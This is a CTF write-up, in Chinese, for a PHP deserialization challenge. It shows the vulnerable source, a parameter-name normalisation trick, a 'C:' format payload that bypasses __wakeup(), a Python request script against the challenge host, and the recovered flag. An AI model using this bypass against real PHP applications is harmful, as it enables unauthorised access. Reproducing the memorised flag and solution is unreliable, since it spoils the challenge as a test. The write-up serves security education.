# Sekai Game Start

## 题目简述

题目直接展示 PHP 源码，并把 GET 参数交给 `unserialize()`。目标类的析构函数会在属性 `start` 严格等于布尔值 `true` 时输出 flag，但普通对象反序列化会触发 `__wakeup()`，把该属性改成 `false`。

利用需要解决两个细节：构造 PHP 能识别的特殊参数名 `sekai_game.run`，以及使用 `C:` 序列化格式绕过 `__wakeup()`。

## 解题过程

核心代码如下：

```php
class Sekai_Game {
    public $start = True;

    public function __destruct() {
        if ($this->start === True) {
            echo "Sekai Game Start Here is your flag ".getenv('FLAG');
        }
    }

    public function __wakeup() {
        $this->start = False;
    }
}

if (isset($_GET['sekai_game.run'])) {
    unserialize($_GET['sekai_game.run']);
} else {
    highlight_file(__FILE__);
}
```

直接发送参数名 `sekai_game.run` 不会成功，因为 PHP 会在解析外部变量时把参数名中的点转换为下划线，最终得到 `sekai_game_run`。题目使用 PHP 7.4；在这一解析行为下，可以发送未闭合方括号形式的键：

```text
sekai[game.run
```

PHP 将其中的 `[` 归一化为 `_`，同时保留后面的点，于是 `$_GET` 中实际出现源码要求的键 `sekai_game.run`。

接下来处理反序列化。常见的 `O:` 对象格式会调用 `__wakeup()`，无论怎样设置 `start` 都会被重置。PHP 官方问题记录 [Bug #81151](https://bugs.php.net/bug.php?id=81151) 展示了另一种行为：对没有实现 `Serializable` 的类使用旧式 `C:` 自定义序列化格式时，PHP 7 会发出警告，却仍创建对象；该路径不调用 `__wakeup()`，对象销毁时仍会调用 `__destruct()`。

利用值为：

```text
C:10:"Sekai_Game":0:{}
```

其中 `10` 是类名 `Sekai_Game` 的长度，`0` 表示自定义数据区长度为 0。新对象保留类中声明的默认值 `$start = true`，所以请求结束时析构函数的严格比较成立。

可以让 `requests` 负责 URL 编码：

```python
import requests

url = "http://sekai-game-start.ctf.sekai.team/"
payload = 'C:10:"Sekai_Game":0:{}'

response = requests.get(
    url,
    params={"sekai[game.run": payload},
    timeout=10,
)
print(response.text)
```

等价的查询串形如：

```text
?sekai[game.run=C%3A10%3A%22Sekai_Game%22%3A0%3A%7B%7D
```

响应给出：

```text
SEKAI{W3lcome_T0_Our_universe}
```

## 方法总结

这道题把两个 PHP 兼容性细节串在一起。参数名归一化负责让攻击者构造源码中看似无法从 HTTP 传入的键；旧式 `C:` 格式则让对象跳过 `__wakeup()`，但仍走到析构函数。

分析 PHP 反序列化题时，不能只盯着属性覆盖。还应区分 `O:`、`C:` 等序列化格式对应的魔术方法调用顺序，并根据容器中的确切 PHP 版本验证行为。这里的 `C:` 绕过是 PHP 7.4 行为，不应假设在所有现代 PHP 版本中都完全相同。
